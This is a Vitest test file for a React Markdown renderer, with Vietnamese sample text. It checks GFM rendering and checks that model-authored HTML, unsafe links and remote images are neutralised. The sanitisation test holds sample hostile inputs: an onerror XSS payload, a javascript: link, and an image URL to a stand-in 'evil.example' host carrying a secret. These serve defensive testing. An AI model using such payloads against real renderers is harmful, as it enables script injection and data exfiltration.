import { describe, expect, it } from 'vitest'
import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { Markdown } from '../src/ui/Markdown'

const render = (text: string): string => renderToStaticMarkup(createElement(Markdown, { text }))

describe('Markdown', () => {
  it('renders GFM structure and citation chips', () => {
    const html = render('## Tóm tắt\n\n- Chốt ngày #12\n- [x] Xong\n\n| Ai | Việc |\n| - | - |\n| Minh | Review |')
    expect(html).toContain('<h3')
    expect(html).toContain('<table')
    expect(html).toContain('type="checkbox"')
    expect(html).toMatch(/<span class="[^"]*cite[^"]*">#12<\/span>/u)
  })

  it('never emits model-authored HTML, unsafe links or remote images', () => {
    const html = render('<img src=x onerror=alert(1)>\n\n[bấm](javascript:alert(1)) [ok](https://example.com) ![lộ](https://evil.example/?q=secret)')
    expect(html).not.toContain('<img')
    expect(html).toContain('&lt;img src=x onerror=alert(1)&gt;')
    expect(html).not.toContain('javascript:')
    expect(html).toContain('href="https://example.com"')
    expect(html).toContain('rel="noopener noreferrer nofollow"')
    expect(html).not.toContain('evil.example')
    expect(html).toContain('[ảnh: lộ]')
  })
})
